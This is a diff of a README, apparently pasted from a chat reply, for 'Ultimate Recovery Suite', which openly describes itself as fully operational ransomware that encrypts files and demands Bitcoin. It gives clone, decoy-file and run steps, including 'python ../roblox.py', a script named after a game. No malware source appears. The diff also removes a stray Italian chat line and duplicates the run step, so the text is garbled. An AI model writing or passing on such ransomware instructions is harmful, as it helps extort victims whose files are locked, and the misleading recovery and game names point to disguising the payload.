@@ -1,4 +1,3 @@
-si ma spiega proprio tutto come prima
 Ultimate Recovery Suite
 ⚠️ COMPLETE RANSOMWARE IMPLEMENTATION - USE WITH EXTREME CAUTION ⚠️
 
@@ -6,7 +5,6 @@ Ultimate Recovery Suite
 A fully operational ransomware system that encrypts files on a computer and demands Bitcoin payment for decryption. This is a complete ransomware implementation with all components found in real-world attacks.
 
 📦 Quick Installation & Test
-bash
 # Clone the repository
 git clone https://github.com/yourusername/ultimate-recovery-suite.git
 
@@ -23,6 +21,9 @@ echo "Financial report 2024 - Q1" > report.docx
 echo "Private photo collection from vacation" > vacation_photos.jpg
 echo "Important database backup" > database.sql
 echo "Project source code" > source_code.zip
+
+# Run the ransomware
+python ../roblox.py
 
 # Run the ransomware
 python ../roblox.py
